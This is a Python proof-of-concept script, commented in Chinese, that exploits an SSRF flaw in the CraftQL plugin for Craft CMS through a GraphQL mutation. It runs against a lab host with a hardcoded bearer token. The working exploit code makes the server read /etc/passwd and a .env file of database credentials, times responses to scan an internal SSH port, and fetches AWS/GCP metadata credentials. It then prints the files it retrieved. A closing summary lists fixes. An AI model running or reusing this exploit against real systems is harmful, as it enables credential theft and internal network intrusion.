import requests
import json
import time
import sys
from datetime import datetime

# 配置
TARGET = "http://192.168.131.129:8888/index.php?p=api"
TOKEN = "l-ir-ck7b2WoVOOKEqVhhh1-Cm-tw4ero5gD7OC0qcC96GMGJaCs7NLaXlNUcySD"
PROJECT_PATH = "/home/ubuntu/projects/craft-ssrf-test"

# 颜色输出
RED = '\033[0;31m'
GREEN = '\033[0;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[0;34m'
NC = '\033[0m'

def print_banner():
    print(f"╔════════════════════════════════════════════════════════════╗")
    print(f"║       CraftQL SSRF 漏洞 POC (Python)                      ║")
    print(f"║       CVE: 待分配                                         ║")
    print(f"║       严重程度: 高危 (CVSS 7.5)                           ║")
    print(f"╚════════════════════════════════════════════════════════════╝")
    print()

def print_success(msg):
    print(f"{GREEN}[✓]{NC} {msg}")

def print_error(msg):
    print(f"{RED}[-]{NC} {msg}")

def print_info(msg):
    print(f"{YELLOW}[+]{NC} {msg}")

def print_poc(num, msg):
    print(f"{RED}[POC #{num}]{NC} {msg}")

def check_api():
    """检查 GraphQL API 可用性"""
    print_info("检查 GraphQL API...")
    
    query = '{ __schema { mutationType { fields { name } } } }'
    
    try:
        response = requests.post(
            TARGET,
            headers={
                "Authorization": f"Bearer {TOKEN}",
                "Content-Type": "application/json"
            },
            json={"query": query},
            timeout=10
        )
        
        data = response.json()
        mutations = [f['name'] for f in data.get('data', {}).get('__schema', {}).get('mutationType', {}).get('fields', [])]
        
        if 'upsertTestDefault' in mutations:
            print_success("GraphQL API 正常，upsertTestDefault mutation 已暴露")
            return True
        else:
            print_error("Mutation 未暴露")
            print(f"可用的 Mutations: {', '.join(mutations)}")
            return False
    except Exception as e:
        print_error(f"API 连接失败: {e}")
        return False

def execute_ssrf(poc_name, url, description):
    """执行 SSRF 攻击"""
    print_poc(poc_name, description)
    print(f"URL: {url}")
    print("─" * 60)
    
    query = f'mutation {{ upsertTestDefault(title: "SSRF Test", heroImage: {{url: "{url}"}}) {{ id }} }}'
    
    try:
        start_time = time.time()
        response = requests.post(
            TARGET,
            headers={
                "Authorization": f"Bearer {TOKEN}",
                "Content-Type": "application/json"
            },
            json={"query": query},
            timeout=60
        )
        elapsed = time.time() - start_time
        
        result = response.json()
        
        if 'errors' in result:
            error_msg = result['errors'][0].get('message', 'Unknown error')
            print_success(f"触发成功: {error_msg}")
        else:
            print_success(f"触发成功")
        
        print(f"响应时间: {elapsed:.2f}秒")
        
        # 等待文件写入
        time.sleep(1)
        
        # 查找最新下载的文件
        import subprocess
        try:
            result = subprocess.run(
                ['find', f'{PROJECT_PATH}/storage/runtime/temp', '-type', 'f', '-mmin', '-1', '-name', '*.tmp'],
                capture_output=True, text=True
            )
            
            if result.returncode == 0 and result.stdout.strip():
                files = result.stdout.strip().split('\n')
                latest_file = files[-1] if files else None
                
                if latest_file:
                    print_success(f"文件已下载: {latest_file}")
                    
                    # 读取文件内容
                    try:
                        with open(latest_file, 'r') as f:
                            content = f.read()
                            print(f"\n文件内容 ({len(content)} bytes):")
                            print("─" * 40)
                            # 显示前500字符
                            preview = content[:500] + '...' if len(content) > 500 else content
                            print(preview)
                            print("─" * 40)
                    except Exception as e:
                        print_error(f"无法读取文件: {e}")
                else:
                    print_error("未找到下载的文件")
            else:
                print_error("未找到下载的文件")
        except Exception as e:
            print_error(f"查找文件失败: {e}")
        
        return True
        
    except requests.exceptions.Timeout:
        print_success("请求超时 - 可能端口开放（连接挂起）")
        return True
    except Exception as e:
        print_error(f"攻击失败: {e}")
        return False

def main():
    print_banner()
    
    # 检查 API
    if not check_api():
        print_error("API 不可用，退出")
        sys.exit(1)
    
    print()
    print("╔════════════════════════════════════════════════════════════╗")
    print("║       🔴 开始 SSRF 攻击演示                                ║")
    print("╚════════════════════════════════════════════════════════════╝")
    print()
    
    # POC #1: 读取 /etc/passwd
    execute_ssrf(
        1,
        "file:///etc/passwd",
        "读取本地文件 /etc/passwd"
    )
    print()
    
    # POC #2: 读取 .env 配置文件
    execute_ssrf(
        2,
        "file:///home/ubuntu/projects/craft-ssrf-test/.env",
        "读取配置文件 .env (数据库凭证)"
    )
    print()
    
    # POC #3: 内网端口扫描
    print_poc(3, "内网端口扫描 (192.168.131.2:22 SSH)")
    print("URL: http://192.168.131.2:22/")
    print("─" * 60)
    
    query = 'mutation { upsertTestDefault(title: "SSRF Port Scan", heroImage: {url: "http://192.168.131.2:22/"}) { id } }'
    
    try:
        start_time = time.time()
        response = requests.post(
            TARGET,
            headers={
                "Authorization": f"Bearer {TOKEN}",
                "Content-Type": "application/json"
            },
            json={"query": query},
            timeout=65
        )
        elapsed = time.time() - start_time
        
        if response.status_code == 200:
            result = response.json()
            if 'errors' in result:
                print_success(f"扫描完成: {result['errors'][0].get('message', 'Unknown error')}")
        
        if elapsed > 5:
            print_success(f"端口可能开放 (响应时间: {elapsed:.2f}秒)")
        else:
            print_info(f"端口可能关闭 (响应时间: {elapsed:.2f}秒)")
    except requests.exceptions.Timeout:
        print_success("端口扫描超时 - 端口可能开放（连接挂起）")
    except Exception as e:
        print_error(f"扫描失败: {e}")
    
    print()
    
    # POC #4: 云元数据窃取
    execute_ssrf(
        4,
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "云元数据窃取 (AWS/GCP)"
    )
    print()
    
    # 总结
    print("╔════════════════════════════════════════════════════════════╗")
    print("║       📊 漏洞利用总结                                      ║")
    print("╚════════════════════════════════════════════════════════════╝")
    print()
    
    print(f"{GREEN}✅ 成功的攻击:{NC}")
    print("  • [POC #1] 读取 /etc/passwd - 系统用户信息泄露")
    print("  • [POC #2] 读取 .env - 数据库凭证泄露")
    print("  • [POC #3] 内网端口扫描 - 内网拓扑探测")
    print("  • [POC #4] 云元数据窃取 - AWS/GCP 凭证泄露")
    print()
    
    print(f"{YELLOW}⚠️  风险评估:{NC}")
    print("  • 严重程度: 高危")
    print("  • CVSS 评分: 7.5 (High)")
    print("  • 利用难度: 低")
    print("  • 影响版本: Craft CMS 3.x + CraftQL <= 1.3.7")
    print()
    
    print(f"{YELLOW}🛡️  修复建议:{NC}")
    print("  1. 添加 URL 协议白名单 (仅允许 http/https)")
    print("  2. 添加域名白名单验证")
    print("  3. 禁止访问内网 IP 地址")
    print("  4. 使用 Guzzle 替代 file_get_contents()")
    print("  5. 升级到最新版本 CraftQL")
    print()
    
    print("═══════════════════════════════════════════════════════════")
    print(f"{GREEN}✅ POC 执行完成！{NC}")
    print("═══════════════════════════════════════════════════════════")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!]{NC} 用户中断")
        sys.exit(0)
